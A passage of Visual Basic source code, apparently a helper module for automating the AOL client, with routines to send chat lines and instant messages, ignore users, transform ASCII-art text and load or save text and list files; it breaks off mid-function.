Public Sub ChatIgnoreByName(name As String)
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Dim lIndex As Long
    Room& = FindRoom&
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> GetUser$ And LCase(ScreenName$) = LCase(name$) Then
                lIndex& = index&
                Call ChatIgnoreByIndex(lIndex&)
                DoEvents
                Exit Sub
            End If
        Next index&
        Call CloseHandle(mThread)
    End If
End Sub
Public Function ChatLineSN(TheChatLine As String) As String
    If InStr(TheChatLine, ":") = 0 Then
        ChatLineSN = ""
        Exit Function
    End If
    ChatLineSN = Left(TheChatLine, InStr(TheChatLine, ":") - 1)
End Function
Public Function ChatLineMsg(TheChatLine As String) As String
    If InStr(TheChatLine, Chr(9)) = 0 Then
        ChatLineMsg = ""
        Exit Function
    End If
    ChatLineMsg = Right(TheChatLine, Len(TheChatLine) - InStr(TheChatLine, Chr(9)))
End Function
Public Sub Scroll(ScrollString As String)
    Dim CurLine As String, count As Long, ScrollIt As Long
    Dim sProgress As Long
    If FindRoom& = 0 Then Exit Sub
    If ScrollString$ = "" Then Exit Sub
    count& = LineCount(ScrollString$)
    sProgress& = 1
    For ScrollIt& = 1 To count&
        CurLine$ = LineFromString(ScrollString$, ScrollIt&)
        If Len(CurLine$) > 0 Then
            If Len(CurLine$) > 92 Then
                CurLine$ = Left(CurLine$, 92)
            End If
            Call ChatSend(CurLine$)
            Pause 0.7
        End If
        sProgress& = sProgress& + 1
        If sProgress& > 4 Then
            sProgress& = 1
            Pause 0.5
        End If
    Next ScrollIt&
End Sub
Function Scroll2(ScrollString As String)
    Dim CurLine As String, count As Long, ScrollIt As Long
    Dim sProgress As Long
    If FindRoom& = 0 Then Exit Function
    If ScrollString = "" Then Exit Function
    count& = LineCount(ScrollString$)
    sProgress& = 1
    For ScrollIt& = 1 To count&
        CurLine$ = LineFromString(ScrollString$, ScrollIt&)
        If Len(CurLine$) > 0 Then
            If Len(CurLine$) > 92 Then
                CurLine$ = ".<p=" & CurLine$
            End If
            Call ChatSend(CurLine$)
            Pause 0.7
        End If
        sProgress& = sProgress& + 1
        If sProgress& > 4 Then
            sProgress& = 1
            Pause 0.5
        End If
    Next ScrollIt&
End Function
Public Sub WaitForOKOrRoom(Room As String)
    Dim RoomTitle As String, FullWindow As Long, FullButton As Long
    Room$ = LCase(ReplaceString(Room$, " ", ""))
    Do
        DoEvents
        RoomTitle$ = GetCaption(FindRoom&)
        RoomTitle$ = LCase(ReplaceString(Room$, " ", ""))
        FullWindow& = FindWindow("#32770", "America Online")
        FullButton& = FindWindowEx(FullWindow&, 0&, "Button", "OK")
    Loop Until (FullWindow& <> 0& And FullButton& <> 0&) Or Room$ = RoomTitle$
    DoEvents
    If FullWindow& <> 0& Then
        Do
            DoEvents
            Call SendMessage(FullButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYUP, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYUP, VK_SPACE, 0&)
            FullWindow& = FindWindow("#32770", "America Online")
            FullButton& = FindWindowEx(FullWindow&, 0&, "Button", "OK")
       Loop Until FullWindow& = 0& And FullButton& = 0&
    End If
    DoEvents
End Sub
Public Sub InstantMessage(Person As String, message As String)
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim SendButton As Long, Ok As Long, Button As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call KeyWord("aol://9293:" & Person$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        SendButton& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich& <> 0& And SendButton& <> 0&
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, message$)
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        Ok& = FindWindow("#32770", "America Online")
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
    Loop Until Ok& <> 0& Or im& = 0&
    If Ok& <> 0& Then
        Button& = FindWindowEx(Ok&, 0&, "Button", vbNullString)
        Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    End If
End Sub
Public Sub IMIgnore(Person As String)
    Call InstantMessage("$IM_OFF " & Person$, "=)")
End Sub
Public Sub IMUnIgnore(Person As String)
    Call InstantMessage("$IM_ON " & Person$, "=)")
End Sub
Public Sub imsoff()
    Call InstantMessage("$IM_OFF", "=)")
End Sub
Public Sub imson()
    Call InstantMessage("$IM_ON", "=)")
End Sub
Public Function IMSender() As String
    Dim im As Long, Caption As String
    Caption$ = GetCaption(FindIM&)
    If InStr(Caption$, ":") = 0& Then
        IMSender$ = ""
        Exit Function
    Else
        IMSender$ = Right(Caption$, Len(Caption$) - InStr(Caption$, ":") - 1)
    End If
End Function
Public Function IMText() As String
    Dim Rich As Long
    Rich& = FindWindowEx(FindIM&, 0&, "RICHCNTL", vbNullString)
    IMText$ = GetText(Rich&)
End Function
Public Function IMLastMsg() As String
    Dim Rich As Long, MsgString As String, Spot As Long
    Dim NewSpot As Long
    Rich& = FindWindowEx(FindIM&, 0&, "RICHCNTL", vbNullString)
    MsgString$ = GetText(Rich&)
    NewSpot& = InStr(MsgString$, Chr(9))
    Do
        Spot& = NewSpot&
        NewSpot& = InStr(Spot& + 1, MsgString$, Chr(9))
    Loop Until NewSpot& <= 0&
    MsgString$ = Right(MsgString$, Len(MsgString$) - Spot& - 1)
    IMLastMsg$ = Left(MsgString$, Len(MsgString$) - 1)
End Function
Public Sub IMRespond(msg As String)
    Dim im As Long, Rich As Long, icon As Long
    im& = FindIM&
    If im& = 0& Then Exit Sub
    Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
    Rich& = FindWindowEx(im&, Rich&, "RICHCNTL", vbNullString)
    icon& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(im&, icon&, "_AOL_Icon", vbNullString)
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, msg$)
    DoEvents
    Call SendMessage(icon&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(icon&, WM_LBUTTONUP, 0&, 0&)
    Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    DoEvents
End Sub
Public Sub KeyWord(KW As String)
    Dim AOL As Long, tool As Long, toolbar As Long
    Dim Combo As Long, EditWin As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    Combo& = FindWindowEx(toolbar&, 0&, "_AOL_Combobox", vbNullString)
    EditWin& = FindWindowEx(Combo&, 0&, "Edit", vbNullString)
    Call SendMessageByString(EditWin&, WM_SETTEXT, 0&, KW$)
    Call SendMessageLong(EditWin&, WM_CHAR, VK_SPACE, 0&)
    Call SendMessageLong(EditWin&, WM_CHAR, VK_RETURN, 0&)
End Sub
Public Function DoubleText(MyString As String) As String
    Dim NewString As String, CurChar As String
    Dim DoIt As Long
    If MyString$ <> "" Then
        For DoIt& = 1 To Len(MyString$)
            CurChar$ = LineChar(MyString$, DoIt&)
            NewString$ = NewString$ & CurChar$ & CurChar$
        Next DoIt&
        DoubleText$ = NewString$
    End If
End Function
Public Function LineChar(thetext As String, CharNum As Long) As String
    Dim TextLength As Long, NewText As String
    TextLength& = Len(thetext$)
    If CharNum& > TextLength& Then
        Exit Function
    End If
    NewText$ = Left(thetext$, CharNum&)
    NewText$ = Right(NewText$, 1)
    LineChar$ = NewText$
End Function
Public Function LineCount(MyString As String) As Long
    Dim Spot As Long, count As Long
    If Len(MyString$) < 1 Then
        LineCount& = 0&
        Exit Function
    End If
    Spot& = InStr(MyString$, Chr(13))
    If Spot& <> 0& Then
        LineCount& = 1
        Do
            Spot& = InStr(Spot + 1, MyString$, Chr(13))
            If Spot& <> 0& Then
                LineCount& = LineCount& + 1
            End If
        Loop Until Spot& = 0&
    End If
    LineCount& = LineCount& + 1
End Function
Public Function LineFromString(MyString As String, Line As Long) As String
    Dim theline As String, count As Long
    Dim FSpot As Long, LSpot As Long, DoIt As Long
    count& = LineCount(MyString$)
    If Line& > count& Then
        Exit Function
    End If
    If Line& = 1 And count& = 1 Then
        LineFromString$ = MyString$
        Exit Function
    End If
    If Line& = 1 Then
        theline$ = Left(MyString$, InStr(MyString$, Chr(13)) - 1)
        theline$ = ReplaceString(theline$, Chr(13), "")
        theline$ = ReplaceString(theline$, Chr(10), "")
        LineFromString$ = theline$
        Exit Function
    Else
        FSpot& = InStr(MyString$, Chr(13))
        For DoIt& = 1 To Line& - 1
            LSpot& = FSpot&
            FSpot& = InStr(FSpot& + 1, MyString$, Chr(13))
        Next DoIt
        If FSpot = 0 Then
            FSpot = Len(MyString$)
        End If
        theline$ = Mid(MyString$, LSpot&, FSpot& - LSpot& + 1)
        theline$ = ReplaceString(theline$, Chr(13), "")
        theline$ = ReplaceString(theline$, Chr(10), "")
        LineFromString$ = theline$
    End If
End Function
Public Function ReplaceString(MyString As String, ToFind As String, ReplaceWith As String) As String
    Dim Spot As Long, NewSpot As Long, LeftString As String
    Dim RightString As String, NewString As String
    Spot& = InStr(LCase(MyString$), LCase(ToFind))
    NewSpot& = Spot&
    Do
        If NewSpot& > 0& Then
            LeftString$ = Left(MyString$, NewSpot& - 1)
            If Spot& + Len(ToFind$) <= Len(MyString$) Then
                RightString$ = Right(MyString$, Len(MyString$) - NewSpot& - Len(ToFind$) + 1)
            Else
                RightString = ""
            End If
            NewString$ = LeftString$ & ReplaceWith$ & RightString$
            MyString$ = NewString$
        Else
            NewString$ = MyString$
        End If
        Spot& = NewSpot& + Len(ReplaceWith$)
        If Spot& > 0 Then
            NewSpot& = InStr(Spot&, LCase(MyString$), LCase(ToFind$))
        End If
    Loop Until NewSpot& < 1
    ReplaceString$ = NewString$
End Function
Public Function ReverseString(MyString As String) As String
    Dim TempString As String, StringLength As Long
    Dim count As Long, NextChr As String, NewString As String
    TempString$ = MyString$
    StringLength& = Len(TempString$)
    Do While count& <= StringLength&
        count& = count& + 1
        NextChr$ = Mid$(TempString$, count&, 1)
        NewString$ = NextChr$ & NewString$
    Loop
    ReverseString$ = NewString$
End Function
Public Function SwitchStrings(MyString As String, String1 As String, String2 As String) As String
    Dim TempString As String, Spot1 As Long, Spot2 As Long
    Dim Spot As Long, ToFind As String, ReplaceWith As String
    Dim NewSpot As Long, LeftString As String, RightString As String
    Dim NewString As String
    If Len(String2) > Len(String1) Then
        TempString$ = String1$
        String1$ = String2$
        String2$ = TempString$
    End If
    Spot1& = InStr(MyString$, String1$)
    Spot2& = InStr(MyString$, String2$)
    If Spot1& = 0& And Spot2& = 0& Then
        SwitchStrings$ = MyString$
        Exit Function
    End If
    If Spot1& < Spot2& Or Spot2& = 0 Or Len(String1$) = Len(String2$) Then
        If Spot1& > 0 Then
            Spot& = Spot1&
            ToFind$ = String1$
            ReplaceWith$ = String2$
        End If
    End If
    If Spot2& < Spot1& Or Spot1& = 0& Then
        If Spot2& > 0& Then
            Spot& = Spot2&
            ToFind$ = String2$
            ReplaceWith$ = String1$
        End If
    End If
    If Spot1& = 0& And Spot2& = 0& Then
        SwitchStrings$ = MyString$
        Exit Function
    End If
    NewSpot& = Spot&
    Do
        If NewSpot& > 0& Then
            LeftString$ = Left(MyString$, NewSpot& - 1)
            If Spot& + Len(ToFind$) <= Len(MyString$) Then
                RightString$ = Right(MyString$, Len(MyString$) - NewSpot& - Len(ToFind$) + 1)
            Else
                RightString$ = ""
            End If
            NewString$ = LeftString$ & ReplaceWith$ & RightString$
            MyString$ = NewString$
        Else
            NewString$ = MyString$
        End If
        Spot& = NewSpot + Len(ReplaceWith$) - Len(ToFind$) + 1
        If Spot& <> 0& Then
            Spot1& = InStr(Spot&, MyString$, String1$)
            Spot2& = InStr(Spot&, MyString$, String2$)
        End If
        If Spot1& = 0& And Spot2& = 0& Then
            SwitchStrings$ = MyString$
            Exit Function
        End If
        If Spot1& < Spot2& Or Spot2& = 0& Or Len(String1$) = Len(String2$) Then
            If Spot1& > 0& Then
                Spot& = Spot1&
                ToFind$ = String1$
                ReplaceWith$ = String2$
            End If
        End If
        If Spot2& < Spot1& Or Spot1& = 0& Then
            If Spot2& > 0& Then
                Spot& = Spot2&
                ToFind$ = String2$
                ReplaceWith$ = String1$
            End If
        End If
        If Spot1& = 0& And Spot2& = 0& Then
            Spot& = 0&
        End If
        If Spot& > 0& Then
            NewSpot& = InStr(Spot&, MyString$, ToFind$)
        Else
            NewSpot& = Spot&
        End If
    Loop Until NewSpot& < 1&
    SwitchStrings$ = NewString$
End Function
Public Function MacroFilterBCurve(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "\", "]")
    MyString$ = ReplaceString(MyString$, "/", "[")
    MacroFilterBCurve$ = MyString$
End Function
Public Function MacroFilterBubbleTop(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¯¯¯", "°'°'°'")
    MacroFilterBubbleTop$ = MyString$
End Function
Public Function MacroFilterBubbleTop2(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¯¯¯", "º°°°'")
    MacroFilterBubbleTop2$ = MyString$
End Function
Public Function MacroFilterClawTop(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¯¯¯¯¯¯", "¯\(¯)/" & Chr(34) & "¯")
    MacroFilterClawTop$ = MyString$
End Function
Public Function MacroFilterCurve(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "\", ")")
    MyString$ = ReplaceString(MyString$, "/", "(")
    MacroFilterCurve$ = MyString$
End Function
Public Function MacroFilterCurveBottom(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "___", "î,î,î,")
    MacroFilterCurveBottom$ = MyString$
End Function
Public Function MacroFilterDarken(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¦", "|")
    MyString$ = ReplaceString(MyString$, ",´", "/ ")
    MyString$ = ReplaceString(MyString$, "`,", " \")
    MyString$ = ReplaceString(MyString$, ":", ";")
    MacroFilterDarken$ = MyString$
End Function
Public Function MacroFilterDestroy(MyString As String) As String
    MyString$ = ReplaceString(MyString$, " ", "")
    MacroFilterDestroy$ = MyString$
End Function
Public Function MacroFilterDrippingTop(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¯¯¯¯¯", "¯\,/¯'v'")
    MacroFilterDrippingTop$ = MyString$
End Function
Public Function MacroFilterElectric(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "      |", "--^v^|")
    MyString$ = ReplaceString(MyString$, "|      ", "|^v^--")
    MacroFilterElectric$ = MyString$
End Function
Public Function MacroFilterFireyBottom(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "___", "_')\.")
    MacroFilterFireyBottom$ = MyString$
End Function
Public Function MacroFilterGhost(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¯", "¨¨")
    MyString$ = ReplaceString(MyString$, "/", ".·")
    MyString$ = ReplaceString(MyString$, "\", "·.")
    MyString$ = ReplaceString(MyString$, "|", ":")
    MyString$ = ReplaceString(MyString$, "_", "..")
    MyString$ = ReplaceString(MyString$, "¦", ":")
    MacroFilterGhost = MyString$
End Function
Public Function MacroFilterIndent(MyString As String) As String
    Dim NewLine As String, OrgLen As Long, NumOfLines As Long
    Dim OrgCount As Long, SpaceIt As Long, CurLine As String
    Dim NewString As String
    NewLine$ = Chr(13) & Chr(10)
    OrgLen& = Len(MyString$)
    MyString$ = MyString$ & NewLine$
    NumOfLines& = LineCount(MyString$)
    OrgCount& = NumOfLines&
    For SpaceIt& = 1 To NumOfLines&
        DoEvents
        CurLine$ = LineFromString(MyString$, SpaceIt&)
        NewString$ = NewString$ & " " & CurLine$ & NewLine$
    Next SpaceIt&
    MyString$ = Left(NewString$, OrgLen& + OrgCount& - 1)
    MacroFilterIndent$ = MyString$
End Function
Public Function MacroFilterJaG(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¯¯¯¯", "¯`v´¯")
    MacroFilterJaG$ = MyString$
End Function
Public Function MacroFilterLighten(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "|", "¦")
    MyString$ = ReplaceString(MyString$, "/ ", ",´")
    MyString$ = ReplaceString(MyString$, "\ ", "`,")
    MyString$ = ReplaceString(MyString$, " /", ",´")
    MyString$ = ReplaceString(MyString$, " \", "`,")
    MyString$ = ReplaceString(MyString$, ";", ":")
    MacroFilterLighten$ = MyString$
End Function
Public Function MacroFilterPCurve(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "\", "}")
    MyString$ = ReplaceString(MyString$, "/", "{")
    MacroFilterPCurve$ = MyString$
End Function
Public Function MacroFilterPsYTop(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¯¯¯", "`'¯`“")
    MacroFilterPsYTop$ = MyString$
End Function
Public Function MacroFilterRandomBottom(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "___", "-‚„‚¸‚")
    MacroFilterRandomBottom$ = MyString$
End Function
Public Function MacroFilterRapid(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "   |", "-=|")
    MyString$ = ReplaceString(MyString$, "|   ", "|=-")
    MacroFilterRapid$ = MyString$
End Function
Public Function MacroFilterReplaceLines(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "|", "¦")
    MacroFilterReplaceLines$ = MyString$
End Function
Public Function MacroFilterReplaceSlants(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "/ ", ",´")
    MyString$ = ReplaceString(MyString$, "\ ", "`,")
    MyString$ = ReplaceString(MyString$, " /", ",´")
    MyString$ = ReplaceString(MyString$, " \", "`,")
    MacroFilterReplaceSlants$ = MyString$
End Function
Public Function MacroFilterReverse(MyString As String) As String
    Dim CurChar As Long, NewLine As String, MyText As String
    Dim NumOfLines As Long, ReverseIt As Long, CheckLen As Long
    Dim CurLine As String, NewString As String
    If MyString$ <> "" Then
        NewLine$ = Chr(13) & Chr(10)
        MyText$ = MyString$ & NewLine$
        NumOfLines& = LineCount(MyText$)
        For ReverseIt& = 1 To NumOfLines
            CurLine$ = LineFromString(MyText$, ReverseIt&)
            CurLine$ = ReverseString(CurLine$)
            NewString$ = NewString$ & CurLine$ & NewLine$
        Next ReverseIt&
        NewString$ = SwitchStrings(NewString$, "/", "\")
        NewString$ = SwitchStrings(NewString$, "[", "]")
        NewString$ = SwitchStrings(NewString$, "{", "}")
        NewString$ = SwitchStrings(NewString$, "(", ")")
        NewString$ = SwitchStrings(NewString$, "«", "»")
        NewString$ = SwitchStrings(NewString$, "‹", "›")
        NewString$ = SwitchStrings(NewString$, "<", ">")
        CheckLen& = Len(NewString$)
        NewString$ = Left(NewString$, CheckLen& - 4)
        MacroFilterReverse$ = NewString$
    End If
End Function
Public Function MacroFilterRoundedTop(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "|¯¯", "|'˜¯")
    MyString$ = ReplaceString(MyString$, "¦¯¯", "¦'˜¯")
    MacroFilterRoundedTop$ = MyString$
End Function
Public Function MacroFilterShadow(MyString As String) As String
    MyString$ = ReplaceString(MyString$, " |", ";|")
    MyString$ = ReplaceString(MyString$, "| ", "|;")
    MacroFilterShadow$ = MyString$
End Function
Public Function MacroFilterSmear(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "|", "¦")
    MyString$ = ReplaceString(MyString$, "   ¦", ".:;¦")
    MyString$ = ReplaceString(MyString$, "  ¦", ":;¦")
    MyString$ = ReplaceString(MyString$, " ¦", ";¦")
    MyString$ = ReplaceString(MyString$, "   /", ".:;/")
    MyString$ = ReplaceString(MyString$, "  /", ":;/")
    MyString$ = ReplaceString(MyString$, " /", ";/")
    MyString$ = ReplaceString(MyString$, "   \", ".:;\")
    MyString$ = ReplaceString(MyString$, "  \", ":;\")
    MyString$ = ReplaceString(MyString$, " \", ";\")
    MyString$ = ReplaceString(MyString$, "   '", ".:;'")
    MyString$ = ReplaceString(MyString$, "  '", ":;'")
    MyString$ = ReplaceString(MyString$, " '", ";'")
    MacroFilterSmear$ = MyString$
End Function
Public Function MacroFilterSpikeBottom(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "___", "¸¡¸¡¸¡")
    MacroFilterSpikeBottom$ = MyString$
End Function
Public Function MacroFilterStraighten(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "}", "\")
    MyString$ = ReplaceString(MyString$, "{", "/")
    MyString$ = ReplaceString(MyString$, "]", "\")
    MyString$ = ReplaceString(MyString$, "[", "/")
    MyString$ = ReplaceString(MyString$, ")", "\")
    MyString$ = ReplaceString(MyString$, "(", "/")
    MacroFilterStraighten$ = MyString$
End Function
Public Function MacroFilterStretch(MyString As String) As String
    Dim CurChar As Long, StretchIt As Long, MyText As String
    Dim NewLine As String, NumOfLines As Long, CheckLen As Long
    Dim CurLine As String, NewString As String
    If MyString$ <> "" Then
        NewLine$ = Chr(13) & Chr(10)
        MyText$ = MyString$ & NewLine$
        NumOfLines& = LineCount(MyText$)
        For StretchIt& = 1 To NumOfLines&
            CurLine$ = LineFromString(MyText, StretchIt&)
            CurLine$ = DoubleText(CurLine$)
            NewString$ = NewString$ & CurLine$ & NewLine$
        Next StretchIt&
        CheckLen& = Len(NewString$)
        NewString$ = Left(NewString$, CheckLen& - 4)
        MacroFilterStretch$ = NewString$
    End If
End Function
Public Function MacroFilterStarTop(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¯¯¯", "`**¯")
    MacroFilterStarTop$ = MyString$
End Function
Public Function MacroFilterThickenBottom(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "___", "¸‚¸‚¸‚")
    MacroFilterThickenBottom$ = MyString$
End Function
Public Function MacroFilterThickenTop(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¯¯¯", "”‘”‘”‘")
    MacroFilterThickenTop$ = MyString$
End Function
Public Function MacroFilterTreadTop(MyString As String) As String
    MyString$ = ReplaceString(MyString$, "¯¯¯", "ª‘ª‘ª‘")
    MacroFilterTreadTop$ = MyString$
End Function
Public Function MacroFilterUnIndent(MyString As String) As String
    Dim OrgLen As Long, NewLine As String, NumOfLines As Long
    Dim OrgCount As Long, CurLine As String, NewString As String
    Dim SpaceIt As Long
    OrgLen& = Len(MyString$)
    NewLine$ = Chr(13) & Chr(10)
    MyString$ = MyString$ & NewLine$
    NumOfLines& = LineCount(MyString)
    OrgCount& = NumOfLines&
    For SpaceIt& = 1 To NumOfLines&
        CurLine$ = LineFromString(MyString$, SpaceIt&)
        If Len(CurLine$) < 1 Then
            NewString$ = NewString$ & CurLine$ & NewLine$
        Else
            NewString$ = NewString$ & Right(CurLine$, Len(CurLine$) - 1) & NewLine$
        End If
    Next SpaceIt&
    MyString$ = Left(NewString$, Len(NewString$) - 4)
    MacroFilterUnIndent$ = MyString$
End Function
Public Function MacroFilterUpsideDown(MyString As String) As String
    Dim CharCheck As Long, CurChar As Long, CurLine As String
    Dim FlipIt As Long, MyLine As Long, MyText As String
    Dim NewLine As String, NumOfLines As Long
    Dim CheckLen As Long, NewString As String
    If MyString$ <> "" Then
        NewLine$ = Chr(13) & Chr(10)
        MyText$ = MyString$ & NewLine$
        NumOfLines& = LineCount(MyText$)
        MyLine& = NumOfLines& - 1
        For FlipIt& = 1 To NumOfLines&
            DoEvents
            CurLine$ = LineFromString(MyText$, MyLine&)
            NewString$ = NewString$ & CurLine$ & NewLine$
            MyLine& = MyLine& - 1
        Next FlipIt&
        NewString$ = Left(NewString$, Len(NewString$) - 4)
        MyString$ = NewString$
        CheckLen& = Len(NewString$)
        NewString$ = SwitchStrings(MyString$, "/", "\")
        MyString$ = SwitchStrings(MyString$, "¯", "_")
        MyString$ = SwitchStrings(MyString$, ",", "'")
        MyString$ = ReplaceString(MyString$, ",,", ",")
        MyString$ = ReplaceString(MyString$, "`", ",")
        MyString$ = SwitchStrings(MyString$, "´", ".")
        MyString$ = ReplaceString(MyString$, "‘", ".")
        MyString$ = ReplaceString(MyString$, "’", ",")
        MyString$ = SwitchStrings(MyString$, "ˆ", "¸")
        MyString$ = SwitchStrings(MyString$, "„", Chr(34))
        MacroFilterUpsideDown$ = MyString$
    End If
End Function
Public Function FileExists(sFileName As String) As Boolean
    If Len(sFileName$) = 0 Then
        FileExists = False
        Exit Function
    End If
    If Len(dir$(sFileName$)) Then
        FileExists = True
    Else
        FileExists = False
    End If
End Function

Sub LoadText(txtLoad As TextBox, Path As String)
    Dim TextString As String
    On Error Resume Next
    Open Path$ For Input As #1
    TextString$ = Input(LOF(1), #1)
    Close #1
    txtLoad.Text = TextString$
End Sub

Sub SaveText(txtSave As TextBox, Path As String)
    Dim TextString As String
    On Error Resume Next
    TextString$ = txtSave.Text
    Open Path$ For Output As #1
    Print #1, TextString$
    Close #1
End Sub

Public Sub Loadlistbox(Directory As String, thelist As ListBox)
    Dim MyString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        DoEvents
        thelist.AddItem MyString$
    Wend
    Close #1
End Sub
Public Sub Load2listboxes(Directory As String, ListA As ListBox, ListB As ListBox)
    Dim MyString As String, aString As String, bString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        aString$ = Left(MyString$, InStr(MyString$, "*") - 1)
        bString$ = Right(MyString$, Len(MyString$) - InStr(MyString$, "*"))
        DoEvents
        ListA.AddItem aString$
        ListB.AddItem bString$
    Wend
    Close #1
End Sub
Public Sub SaveListBox(Directory As String, thelist As ListBox)
    Dim SaveList As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveList& = 0 To thelist.ListCount - 1
        Print #1, thelist.List(SaveList&)
    Next SaveList&
    Close #1
End Sub
Public Sub Save2ListBoxes(Directory As String, ListA As ListBox, ListB As ListBox)
    Dim SaveLists As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveLists& = 0 To ListA.ListCount - 1
        Print #1, ListA.List(SaveLists&) & "*" & ListB.List(SaveLists)
    Next SaveLists&
    Close #1
End Sub
Public Sub SaveComboBox(ByVal Directory As String, Combo As ComboBox)
    Dim SaveCombo As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveCombo& = 0 To Combo.ListCount - 1
        Print #1, Combo.List(SaveCombo&)
    Next SaveCombo&
    Close #1
End Sub
Function FileGetWindowDir()
'gets a windows dir
buffer$ = String$(255, 0)
X = GetWindowsDirectory(buffer$, 255)
If Right$(buffer$, 1) <> "\" Then buffer$ = buffer$ + "\"
FileGetWindowDir = buffer$
End Function
Public Sub LoadComboBox(ByVal Directory As String, Combo As ComboBox)
    Dim MyString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        DoEvents
        Combo.AddItem MyString$
    Wend
    Close #1
End Sub
Public Function FileGetAttributes(TheFile As String) As Integer
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
        FileGetAttributes% = GetAttr(TheFile$)
    End If
End Function
Public Sub FileSetArchive(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
